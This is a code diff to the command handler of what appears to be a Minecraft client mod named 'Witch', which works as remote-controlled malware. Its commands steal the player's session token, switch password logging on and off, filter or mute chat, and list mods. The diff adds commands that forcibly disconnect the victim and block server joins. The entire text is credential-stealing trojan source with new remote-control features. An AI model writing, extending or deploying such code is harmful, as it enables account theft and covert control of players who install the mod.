@@ -20,7 +20,7 @@ public class MessageHandler {
         try {
             switch (messageType) {
                 case "steal_pwd_switch":
-                    Witch.config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
+                    Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                     break;
                 case "steal_token":
                     MessageUtils.sendMessage(messageType, new Gson().toJson(new Stealer.Token()));
@@ -32,10 +32,10 @@ public class MessageHandler {
                     Witch.config.filterPattern = decodeBase64(msgArr[1]);
                     break;
                 case "chat_filter_switch":
-                    Witch.config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
+                    Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                     break;
                 case "chat_mute":
-                    Witch.config.isMuted = Boolean.parseBoolean(msgArr[1]);
+                    Witch.config.isMuted = !Witch.config.isMuted;
                     break;
                 case "mods":
                     MessageUtils.sendMessage(messageType, MinecraftUtil.allMods());
@@ -75,6 +75,13 @@ public class MessageHandler {
                 case "skin":
                     handle("player");
                     MessageUtils.sendMessage(messageType, PlayerSkin.getPlayerSkin());
+                    break;
+                case "server":
+                    ServerUtil.disconnect();
+                    Witch.config.canJoinServer = !Witch.config.canJoinServer;
+                    break;
+                case "kick":
+                    ServerUtil.disconnect();
                     break;
                 case "vanish":
                     //todo
